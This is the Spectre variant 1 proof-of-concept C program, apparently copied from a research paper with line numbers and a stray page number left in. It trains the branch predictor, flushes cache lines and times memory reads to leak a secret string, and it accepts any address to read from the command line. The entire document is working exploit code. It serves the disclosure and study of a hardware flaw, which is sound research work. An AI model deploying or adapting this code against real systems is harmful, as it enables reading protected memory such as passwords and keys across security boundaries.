#include <stdio.h>
2 #include <stdlib.h>
3 #include <stdint.h>
4 #ifdef _MSC_VER
5 #include <intrin.h> /* for rdtscp and clflush */
6 #pragma optimize("gt",on)
7 #else
8 #include <x86intrin.h> /* for rdtscp and clflush */
9 #endif
10
11 /********************************************************************
12 Victim code.
13 ********************************************************************/
14 unsigned int array1_size = 16;
15 uint8_t unused1[64];
16 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
17 uint8_t unused2[64];
18 uint8_t array2[256 * 512];
19
20 char *secret = "The Magic Words are Squeamish Ossifrage.";
21
22 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
23
24 void victim_function(size_t x) {
25 if (x < array1_size) {
26 temp &= array2[array1[x] * 512];
27 }
28 }
29
30
31 /********************************************************************
32 Analysis code
33 ********************************************************************/
34 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
35
36 /* Report best guess in value[0] and runner-up in value[1] */
37 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
38 static int results[256];
39 int tries, i, j, k, mix_i, junk = 0;
40 size_t training_x, x;
41 register uint64_t time1, time2;
42 volatile uint8_t *addr;
43
44 for (i = 0; i < 256; i++)
45 results[i] = 0;
46 for (tries = 999; tries > 0; tries--) {
47
48 /* Flush array2[256*(0..255)] from cache */
49 for (i = 0; i < 256; i++)
50 _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
51
52 /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
53 training_x = tries % array1_size;
54 for (j = 29; j >= 0; j--) {
55 _mm_clflush(&array1_size);
56 for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
57
58 /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
59 /* Avoid jumps in case those tip off the branch predictor */
60 x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
61 x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
62 x = training_x ^ (x & (malicious_x ^ training_x));
63
64 /* Call the victim! */
65 victim_function(x);
15
66 }
67
68 /* Time reads. Order is lightly mixed up to prevent stride prediction */
69 for (i = 0; i < 256; i++) {
70 mix_i = ((i * 167) + 13) & 255;
71 addr = &array2[mix_i * 512];
72 time1 = __rdtscp(&junk); /* READ TIMER */
73 junk = *addr; /* MEMORY ACCESS TO TIME */
74 time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
75 if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
76 results[mix_i]++; /* cache hit - add +1 to score for this value */
77 }
78
79 /* Locate highest & second-highest results results tallies in j/k */
80 j = k = -1;
81 for (i = 0; i < 256; i++) {
82 if (j < 0 || results[i] >= results[j]) {
83 k = j;
84 j = i;
85 } else if (k < 0 || results[i] >= results[k]) {
86 k = i;
87 }
88 }
89 if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
90 break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
91 }
92 results[0] ^= junk; /* use junk so code above won’t get optimized out*/
93 value[0] = (uint8_t)j;
94 score[0] = results[j];
95 value[1] = (uint8_t)k;
96 score[1] = results[k];
97 }
98
99 int main(int argc, const char **argv) {
100 size_t malicious_x=(size_t)(secret-(char*)array1); /* default for malicious_x */
101 int i, score[2], len=40;
102 uint8_t value[2];
103
104 for (i = 0; i < sizeof(array2); i++)
105 array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
106 if (argc == 3) {
107 sscanf(argv[1], "%p", (void**)(&malicious_x));
108 malicious_x -= (size_t)array1; /* Convert input value into a pointer */
109 sscanf(argv[2], "%d", &len);
110 }
111
112 printf("Reading %d bytes:\n", len);
113 while (--len >= 0) {
114 printf("Reading at malicious_x = %p... ", (void*)malicious_x);
115 readMemoryByte(malicious_x++, value, score);
116 printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
117 printf("0x%02X=’%c’ score=%d ", value[0],
118 (value[0] > 31 && value[0] < 127 ? value[0] : ’?’), score[0]);
119 if (score[1] > 0)
120 printf("(second best: 0x%02X score=%d)", value[1], score[1]);
121 printf("\n");
122 }
123 return (0);
124 }